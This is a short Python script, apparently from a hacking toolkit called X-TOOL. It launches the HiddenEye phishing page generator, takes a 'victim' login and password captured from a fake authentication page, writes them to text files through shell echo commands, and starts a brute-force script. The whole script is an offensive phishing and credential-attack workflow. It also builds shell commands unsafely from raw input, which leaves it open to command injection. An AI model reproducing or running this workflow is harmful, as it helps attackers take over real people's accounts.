import os, time
Link = input("Do you have fake auntification page(Y/n)!:").lower()



if Link in ["n"]:
	print("You can use HiddenEye Tool for make fake webpage!")
	Start = input("Start HiddenEye(Y/n)?:").lower()
	if Start in ["y"]:
		os.system("cd && cd X-TOOL && cd HiddenEye && xterm -hold -e 'python3 HiddenEye.py'")
		print("After your started fake auth page and got login and pass do this:")
		login = input("Enter victim Login!:")
		password = input("Enter victim Password!:")
		command = ("echo '") + (login) + ("' >> login.txt && ")
		command2 = ("echo '") + (password) + ("' >> password.txt")
		command1337 = (command) + (command2)
		command0 = ("cd && cd X-TOOL && ") + (command1337)
		os.system(command0)
		os.system("cd && cd X-TOOL && python3 brute.py")
	if Start in ["n"]:
		
		print("After your started fake auth page and got login and pass do this:")
		login = input("Enter victim Login!:")
		password = input("Enter victim Password!:")
		command = ("echo '") + (login) + ("' >> login.txt && ")
		command2 = ("echo '") + (password) + ("' >> password.txt")
		command1337 = (command) + (command2)
		command0 = ("cd && cd X-TOOL && ") + (command1337)
		os.system(command0)
		os.system("cd && cd X-TOOL && python3 brute.py")
